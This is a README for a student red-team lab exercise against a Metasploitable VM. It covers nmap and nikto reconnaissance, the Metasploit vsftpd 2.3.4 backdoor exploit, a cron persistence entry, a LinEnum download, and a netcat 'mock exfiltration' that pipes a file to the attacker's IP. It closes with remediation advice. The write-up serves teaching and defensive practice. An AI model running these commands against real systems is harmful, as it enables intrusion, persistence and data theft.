# cyart-red-teaming — Week 2

**Project:** Week 2 — Red Team Engagement (Kali → Metasploitable)
**Author:** Arbaz Shaikh
**Date:** 03-11-2025
**Target:** Metasploitable — lab only
**Attacker:** Kali — lab only

---

## Overview

This repository contains artifacts, notes, screenshots, and a workflow for a controlled red-team engagement performed against a Metasploitable VM. The exercise demonstrates reconnaissance, exploitation (vsftpd 2.3.4 backdoor), post-exploitation, persistence, and a mock data exfiltration. All activity was executed in an isolated lab environment and limited to VMs under the operator’s control.

---

## Repo Structure

```
cyart-red-teaming/
└── Week 2/
    ├── scans/              # nmap, nikto, dirb outputs
    ├── exploits/           # exploit artifacts, scripts used
    ├── logs/               # msf spool, pcaps, exfil files
    ├── screenshots/        # ordered screenshots (20+)
    ├── report/             # technical_report.md, brief.txt
    └── WORKFLOW.md         # step-by-step reproduction instructions
```

---

## What’s included (key artifacts)

* `scans/nmap_full_tcp_192-168-0-139.txt` — full port scan output
* `scans/nmap_svcs_192-168-0-139.txt` — service/version detection
* `logs/msf_output.txt` — Metasploit spool output showing exploit success
* `exploits/linenum.txt` — local privilege enumeration results
* `logs/meta_traffic_full.pcap` — tcpdump capture of activity
* `logs/mock_data_received.txt` — proof of exfil (mock data)
* `screenshots/` — ordered screenshots with captions and timestamps
* `report/technical_report.md` — detailed findings & remediation
* `report/brief.txt` — 100-word non-technical summary

> **Note:** Filenames may vary slightly — cross-check with your local artifact names before final submission.

---

## Reproduction (high-level)

> **Warning:** Only run these steps in an isolated lab environment with permission.

1. Ensure both VMs are on the same host-only / NAT network.

   * Kali IP: `192.168.0.205`
   * Metasploitable IP: `192.168.0.139`

2. Recon:

```bash
sudo nmap -sS -Pn -p- -T4 192.168.0.139 -oN scans/nmap_full_tcp_192-168-0-139.txt
sudo nmap -sV -sC 192.168.0.139 -oN scans/nmap_svcs_192-168-0-139.txt
dirb http://192.168.0.139/ -o scans/dirb_http.txt
nikto -h http://192.168.0.139 -o scans/nikto_http.txt
smbclient -L //192.168.0.139 -N > scans/smb_enum.txt
```

3. Exploit (Metasploit on Kali):

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.0.139
exploit
# when session opens: run enumeration commands and spool output
```

4. Post-exploitation & persistence:

```bash
# inside session or via sessions -c
uname -a
id
ps aux | head -n 30
netstat -tulpn
# collect LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O exploits/LinEnum.sh
chmod +x exploits/LinEnum.sh
./exploits/LinEnum.sh > exploits/linenum.txt
# create demo persistence
(crontab -l; echo "* * * * * /bin/echo 'backdoor test' >> /tmp/backdoor.log") | crontab -
```

5. Mock exfil:

```bash
# On Kali (listener)
nc -lvp 9001 > logs/mock_data_received.txt
# On target
echo "mock data" > /tmp/mock.txt
cat /tmp/mock.txt | nc 192.168.0.205 9001
```

6. Capture network traffic:

```bash
sudo tcpdump -i any host 192.168.0.139 -w logs/meta_traffic_full.pcap
```

---

## Screenshots & Evidence

Screenshots are saved in `screenshots/` 
---

## Findings (short)

* **Critical:** vsftpd 2.3.4 backdoor — remote root shell (remediate immediately).
* **High:** Multiple exposed services with weak/default configs.
* **Medium:** Persistence via cron; mock exfiltration successful.
  Full findings and remediation details are in `report/technical_report.md`.

---

## Recommendations (prioritized)

1. Patch or remove vulnerable services (FTP).
2. Enforce MFA and strong password policies.
3. Apply network segmentation and egress filtering.
4. Deploy EDR/host monitoring and SIEM rules: alert on new cron tasks, unexpected process spawning, and anomalous DNS/exfil patterns.
5. Regular vulnerability scanning and asset inventory.

---


## Safety & Legal Notice

All testing described here was performed **only** on isolated lab VMs owned or explicitly authorized by the operator. Do **not** run these commands or exploits against systems you do not own or have permission to test. Unauthorized access is illegal.

---


